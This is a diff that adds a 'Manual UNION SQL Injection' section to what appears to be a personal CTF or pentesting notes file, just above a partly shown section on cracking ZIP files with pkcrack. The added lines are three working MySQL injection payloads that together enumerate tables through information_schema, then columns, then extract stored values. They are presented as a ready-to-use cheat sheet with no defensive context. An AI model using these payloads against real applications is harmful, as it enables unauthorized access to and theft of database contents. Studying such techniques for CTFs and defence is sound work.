@@ -1,5 +1,21 @@
 # Notes
 
+### Manual UNION SQL Injection
+*Table*
+```sql
+1' union select (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),2#
+```
+*Columns*
+```sql
+1' union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='nameoftable'),2#
+```
+*Values*
+```sql
+1' union select (select nameofcolumn from nameoftable limit 0,1),2#
+```
+
+
+
 ### Known Plaintext ZIP
 *Download pkcrack*
 ```
